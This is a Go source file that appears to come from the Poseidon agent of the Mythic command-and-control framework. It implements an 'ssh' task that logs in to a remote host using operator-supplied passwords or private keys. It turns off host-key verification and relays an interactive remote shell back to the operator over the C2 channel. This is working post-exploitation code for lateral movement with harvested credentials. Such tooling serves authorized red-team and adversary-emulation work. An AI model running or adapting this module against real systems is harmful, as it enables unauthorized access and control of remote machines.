package ssh

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/enums/InteractiveTask"
	goSSH "golang.org/x/crypto/ssh"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Credential Manages credential objects for authentication
type Credential struct {
	Username   string
	Password   string
	PrivateKey string
}

type SSHParams struct {
	Host       string `json:"host"`
	Port       int    `json:"port"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	PrivateKey string `json:"private_key"`
}

// SSH Functions
func PublicKeyFile(file string) (goSSH.AuthMethod, error) {
	buffer, err := os.ReadFile(file)
	if err != nil {
		return nil, err
	}

	key, err := goSSH.ParsePrivateKey(buffer)
	if err != nil {
		return nil, err
	}
	return goSSH.PublicKeys(key), nil
}

func SSHLogin(host string, port int, cred Credential) (*goSSH.Session, *goSSH.Client, io.Reader, io.Reader, io.Writer, error) {
	var sshConfig *goSSH.ClientConfig
	if cred.PrivateKey == "" {
		sshConfig = &goSSH.ClientConfig{
			User:            cred.Username,
			HostKeyCallback: goSSH.InsecureIgnoreHostKey(),
			Timeout:         500 * time.Millisecond,
			Auth:            []goSSH.AuthMethod{goSSH.Password(cred.Password)},
		}
	} else {
		sshAuthMethodPrivateKey, err := PublicKeyFile(cred.PrivateKey)
		if err != nil {
			return nil, nil, nil, nil, nil, err
		}
		sshConfig = &goSSH.ClientConfig{
			User:            cred.Username,
			Timeout:         500 * time.Millisecond,
			HostKeyCallback: goSSH.InsecureIgnoreHostKey(),
			Auth:            []goSSH.AuthMethod{sshAuthMethodPrivateKey},
		}
	}

	connectionStr := fmt.Sprintf("%s:%d", host, port)
	connection, err := goSSH.Dial("tcp", connectionStr, sshConfig)
	if err != nil {
		return nil, nil, nil, nil, nil, err
	}
	session, err := connection.NewSession()
	if err != nil {
		connection.Close()
		return nil, nil, nil, nil, nil, err
	}
	modes := goSSH.TerminalModes{
		goSSH.ECHO:          0,
		goSSH.TTY_OP_ISPEED: 14400,
		goSSH.TTY_OP_OSPEED: 14400,
	}
	err = session.RequestPty("xterm-256color", 80, 80, modes)
	if err != nil {
		session.Close()
		connection.Close()
		return nil, nil, nil, nil, nil, err
	}
	stdErrPipe, err := session.StderrPipe()
	if err != nil {
		session.Close()
		connection.Close()
		utils.PrintDebug("failed to get stdErrPipe")
		return nil, nil, nil, nil, nil, err
	}
	stdOutPipe, err := session.StdoutPipe()
	if err != nil {
		session.Close()
		connection.Close()
		utils.PrintDebug("failed to get stdOutPipe")
		return nil, nil, nil, nil, nil, err
	}
	stdInPipe, err := session.StdinPipe()
	if err != nil {
		session.Close()
		connection.Close()
		utils.PrintDebug("failed to get stdInPipe")
		return nil, nil, nil, nil, nil, err
	}
	err = session.Shell()
	if err != nil {
		session.Close()
		connection.Close()
		return nil, nil, nil, nil, nil, err
	}
	return session, connection, stdOutPipe, stdErrPipe, stdInPipe, nil
}

func Run(task structs.Task) {
	params := SSHParams{}
	msg := task.NewResponse()
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	if params.Password == "" && params.PrivateKey == "" {
		msg.SetError("Missing password/private key parameter")
		task.Job.SendResponses <- msg
		return
	}
	if params.Username == "" {
		msg.SetError("Missing username parameter.")
		task.Job.SendResponses <- msg
		return
	}
	if params.Port == 0 {
		params.Port = 22
	}
	if params.PrivateKey != "" {
		if strings.HasPrefix(params.PrivateKey, "~/") {
			dirname, _ := os.UserHomeDir()
			params.PrivateKey = filepath.Join(dirname, params.PrivateKey[2:])
		}
	}
	cred := Credential{
		Username:   params.Username,
		Password:   params.Password,
		PrivateKey: params.PrivateKey,
	}
	session, client, stdOutPipe, stdErrPipe, stdInPipe, err := SSHLogin(params.Host, params.Port, cred)
	if err != nil {
		utils.PrintDebug("failed to login")
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	// start processing the new ssh pty
	outputChannel := make(chan string, 1)
	errorChannel := make(chan string, 1)
	doneChannel := make(chan bool, 2)
	doneTimeDelayChannel := make(chan bool)
	sendTimeDelayChannel := make(chan bool)
	go func() {
		// wait for stdin data and pass that along
		for {
			if *task.Job.Stop == 1 {
				return
			}
			select {
			case inputMsg := <-task.Job.InteractiveTaskInputChannel:
				data, err := base64.StdEncoding.DecodeString(inputMsg.Data)

				if err != nil {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(err.Error())),
						MessageType: InteractiveTask.Error,
					}
					continue
				}
				//fmt.Printf("got a message from interactive tasking (%d):\n%s\n", inputMsg.MessageType, data)
				err = nil
				switch inputMsg.MessageType {
				case InteractiveTask.Input:
					_, err = io.Copy(stdInPipe, bytes.NewReader(data))
				case InteractiveTask.CtrlA:
					_, err = stdInPipe.Write([]byte{0x01})
				case InteractiveTask.CtrlB:
					_, err = stdInPipe.Write([]byte{0x02})
				case InteractiveTask.CtrlC:
					_, err = stdInPipe.Write([]byte{0x03})
				case InteractiveTask.CtrlD:
					_, err = stdInPipe.Write([]byte{0x04})
				case InteractiveTask.CtrlE:
					_, err = stdInPipe.Write([]byte{0x05})
				case InteractiveTask.CtrlF:
					_, err = stdInPipe.Write([]byte{0x06})
				case InteractiveTask.CtrlG:
					_, err = stdInPipe.Write([]byte{0x07})
				case InteractiveTask.Backspace:
					_, err = stdInPipe.Write([]byte{0x08})
				case InteractiveTask.Tab:
					if len(data) > 0 {
						_, err = io.Copy(stdInPipe, bytes.NewReader(data))
					}
					_, err = stdInPipe.Write([]byte{0x09})
				case InteractiveTask.CtrlK:
					_, err = stdInPipe.Write([]byte{0x0B})
				case InteractiveTask.CtrlL:
					_, err = stdInPipe.Write([]byte{0x0C})
				case InteractiveTask.CtrlN:
					_, err = stdInPipe.Write([]byte{0x0E})
				case InteractiveTask.CtrlP:
					_, err = stdInPipe.Write([]byte{0x10})
				case InteractiveTask.CtrlQ:
					_, err = stdInPipe.Write([]byte{0x11})
				case InteractiveTask.CtrlR:
					_, err = stdInPipe.Write([]byte{0x12})
				case InteractiveTask.CtrlS:
					_, err = stdInPipe.Write([]byte{0x13})
				case InteractiveTask.CtrlU:
					_, err = stdInPipe.Write([]byte{0x15})
				case InteractiveTask.CtrlW:
					_, err = stdInPipe.Write([]byte{0x17})
				case InteractiveTask.CtrlY:
					_, err = stdInPipe.Write([]byte{0x19})
				case InteractiveTask.CtrlZ:
					_, err = stdInPipe.Write([]byte{0x1A})
				case InteractiveTask.Escape:
					_, err = stdInPipe.Write([]byte{0x1B})
					if len(data) > 0 {
						_, err = io.Copy(stdInPipe, bytes.NewReader(data))
					}
				case InteractiveTask.Exit:
					session.Signal(goSSH.SIGTERM)
					doneChannel <- true
					return
				default:
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte("Unknown control code")),
						MessageType: InteractiveTask.Error,
					}
					continue
				}
				if err != nil {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(err.Error())),
						MessageType: InteractiveTask.Error,
					}
				}
				//fmt.Printf("successfully sent message along to interactive session\n")
			}
		}
	}()
	go func() {
		bufferedOutput := ""
		bufferedError := ""
		for {
			select {
			case <-doneChannel:
				if bufferedOutput != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedOutput)),
						MessageType: InteractiveTask.Output,
					}
				}
				if bufferedError != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedError)),
						MessageType: InteractiveTask.Error,
					}
				}
				return
			case newBufferedOutput := <-outputChannel:
				//fmt.Printf("got new output for buffered channel:\n%s", newBufferedOutput)
				bufferedOutput += newBufferedOutput
			case newBufferedError := <-errorChannel:
				//fmt.Printf("got new error for buffered channel:\n%s", newBufferedError)
				bufferedError += newBufferedError
			case <-sendTimeDelayChannel:
				if bufferedOutput != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedOutput)),
						MessageType: InteractiveTask.Output,
					}
					bufferedOutput = ""
				}
				if bufferedError != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedError)),
						MessageType: InteractiveTask.Error,
					}
					bufferedError = ""
				}

			}
		}
	}()
	go func() {
		for {
			if *task.Job.Stop == 1 {
				session.Close()
				doneChannel <- true
				return
			}
			select {
			case <-doneTimeDelayChannel:
				return
			case <-time.After(1 * time.Second):
				sendTimeDelayChannel <- true
			}
		}
	}()
	go func() {
		stdOutReader := bufio.NewReader(stdOutPipe)
		buff := make([]byte, 1024)
		var totalRead int = 0
		var readError error = nil
		for readError == nil {
			totalRead, readError = stdOutReader.Read(buff)
			if readError != nil && readError == io.EOF {
				//fmt.Printf("reached EOF\n")
				return
			} else if readError != nil {
				//fmt.Printf("got an error reading: %v\n", err)
				return
			} else {
				outputChannel <- fmt.Sprintf("%s", string(buff[:totalRead]))
			}
		}
		//fmt.Printf("Finished reading from tty\n")
	}()
	go func() {
		stdErrReader := bufio.NewReader(stdErrPipe)
		buff := make([]byte, 1024)
		var totalRead int = 0
		var readError error = nil
		for readError == nil {
			totalRead, readError = stdErrReader.Read(buff)
			if readError != nil && readError == io.EOF {
				//fmt.Printf("reached EOF\n")
				return
			} else if readError != nil {
				//fmt.Printf("got an error reading: %v\n", err)
				return
			} else {
				outputChannel <- fmt.Sprintf("%s", string(buff[:totalRead]))
			}
		}
		//fmt.Printf("Finished reading from tty\n")
	}()
	err = session.Wait()
	if err != nil {
		session.Close()
		client.Close()
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		doneTimeDelayChannel <- true
		doneChannel <- true
		return
	}
	session.Close()
	client.Close()
	outputMsg := structs.Response{}
	outputMsg.TaskID = task.TaskID
	outputMsg.Completed = true
	task.Job.SendResponses <- outputMsg
	doneTimeDelayChannel <- true
	doneChannel <- true
	return
}
